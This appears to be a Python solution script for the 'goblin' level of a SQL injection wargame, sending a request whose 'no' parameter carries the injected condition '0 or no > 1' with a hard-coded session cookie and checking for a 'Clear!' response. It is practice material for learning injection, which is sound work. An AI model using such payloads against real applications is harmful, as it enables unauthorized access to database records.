# coding: utf-8

'''
    goblin
    1．orを活用して論理演算の結果を操作
'''
import requests
import re

if __name__ == "__main__":
    cookies = {'PHPSESSID': '1n2m871r2tvs2q678csnl0o3u0'}
    url = 'https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php'
    
    params = {'no': "0 or no > 1"}
    # params = {'no': 3}
    r = requests.get(url=url, params=params, cookies=cookies)
    responseStr = r.content.decode('utf-8')
    print(responseStr)

    clearPattern = re.compile(r'Clear\!')
    if clearPattern.search(responseStr):
        print('yes')
    else:
        print('no')
        print(responseStr.split('</strong>')[0].split('<strong>')[1])
        print(responseStr.split('</h2>')[0].split('<h2>')[1])
